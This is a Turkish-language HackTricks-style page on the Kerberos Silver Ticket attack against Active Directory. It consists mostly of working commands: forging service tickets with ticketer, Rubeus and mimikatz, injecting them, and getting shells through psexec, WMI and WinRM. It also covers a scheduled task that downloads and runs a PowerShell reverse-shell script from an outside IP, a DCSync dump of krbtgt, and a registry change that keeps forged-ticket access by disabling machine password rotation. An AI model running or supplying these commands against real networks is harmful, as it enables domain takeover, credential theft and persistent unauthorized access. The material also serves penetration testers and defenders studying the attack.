# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** saldırısı, Active Directory (AD) ortamlarında hizmet biletlerinin istismarını içerir. Bu yöntem, bir Ticket Granting Service (TGS) bileti oluşturmak için **bir hizmet hesabının NTLM hash'ini edinmeye** dayanır; bu, bir bilgisayar hesabı gibi bir hizmet hesabı olabilir. Bu sahte bilet ile bir saldırgan, genellikle yönetici ayrıcalıkları hedefleyerek, ağdaki belirli hizmetlere **herhangi bir kullanıcıyı taklit ederek** erişebilir. Biletleri sahtelemek için AES anahtarlarının kullanılmasının daha güvenli ve daha az tespit edilebilir olduğu vurgulanmaktadır.

> [!WARNING]
> Silver Ticket'lar, yalnızca **hizmet hesabının hash'ini** gerektirdikleri için Golden Ticket'lara göre daha az tespit edilebilirler, krbtgt hesabını gerektirmezler. Ancak, hedefledikleri belirli hizmetle sınırlıdırlar. Ayrıca, sadece bir kullanıcının şifresini çalmak yeterlidir. 
Ayrıca, bir **hesabın şifresini bir SPN ile ele geçirirseniz**, o şifreyi kullanarak o hizmete herhangi bir kullanıcıyı taklit eden bir Silver Ticket oluşturabilirsiniz.

Bilet oluşturma için, işletim sistemine bağlı olarak farklı araçlar kullanılmaktadır:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows'ta
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS servisi, kurbanın dosya sistemine erişim için yaygın bir hedef olarak öne çıkmaktadır, ancak HOST ve RPCSS gibi diğer hizmetler de görevler ve WMI sorguları için istismar edilebilir.

## Mevcut Hizmetler

| Hizmet Türü                                | Hizmet Gümüş Biletleri                                                   |
| ------------------------------------------ | ------------------------------------------------------------------------ |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                |
| PowerShell Uzak Bağlantı                  | <p>HOST</p><p>HTTP</p><p>İşletim sistemine bağlı olarak ayrıca:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Bazı durumlarda sadece şunu isteyebilirsiniz: WINRM</p> |
| Zamanlanmış Görevler                      | HOST                                                                   |
| Windows Dosya Paylaşımı, ayrıca psexec    | CIFS                                                                   |
| LDAP işlemleri, DCSync dahil              | LDAP                                                                   |
| Windows Uzak Sunucu Yönetim Araçları      | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                     |
| Altın Biletler                             | krbtgt                                                                 |

**Rubeus** kullanarak bu biletlerin hepsini aşağıdaki parametre ile **isteyebilirsiniz**:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Gümüş biletler Olay Kimlikleri

- 4624: Hesap Girişi
- 4634: Hesap Çıkışı
- 4672: Yönetici Girişi

## Süreklilik

Makinelerin her 30 günde bir şifrelerini değiştirmesini önlemek için `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ayarını yapabilir veya `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` değerini 30 günden daha büyük bir değere ayarlayarak makinelerin şifresinin ne zaman değiştirilmesi gerektiğini belirtebilirsiniz.

## Hizmet biletlerini kötüye kullanma

Aşağıdaki örneklerde, biletin yönetici hesabını taklit ederek alındığını varsayalım.

### CIFS

Bu bilet ile `C$` ve `ADMIN$` klasörlerine **SMB** üzerinden (eğer açığa çıkmışlarsa) erişebilir ve uzaktaki dosya sisteminin bir kısmına dosyaları kopyalayabilirsiniz, sadece şunu yaparak:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Ayrıca, **psexec** kullanarak ana bilgisayar içinde bir shell elde edebilir veya rastgele komutlar çalıştırabilirsiniz:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### ANA BİLGİSAYAR

Bu izinle, uzak bilgisayarlarda zamanlanmış görevler oluşturabilir ve rastgele komutlar çalıştırabilirsiniz:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Bu biletlerle **kurban sisteminde WMI'yi çalıştırabilirsiniz**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Daha fazla bilgi için **wmiexec** hakkında aşağıdaki sayfaya bakın:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Winrm erişimi ile bir bilgisayara **erişebilir** ve hatta bir PowerShell alabilirsiniz:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Aşağıdaki sayfayı kontrol ederek **winrm kullanarak uzaktan bir host ile bağlantı kurmanın daha fazla yolunu** öğrenin:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> **winrm'nin uzaktan bilgisayarda aktif ve dinliyor olması gerektiğini** unutmayın.

### LDAP

Bu ayrıcalıkla **DCSync** kullanarak DC veritabanını dökebilirsiniz:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync hakkında daha fazla bilgi edinin** aşağıdaki sayfada:

{{#ref}}
dcsync.md
{{#endref}}


## Referanslar

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)



{{#include ../../banners/hacktricks-training.md}}
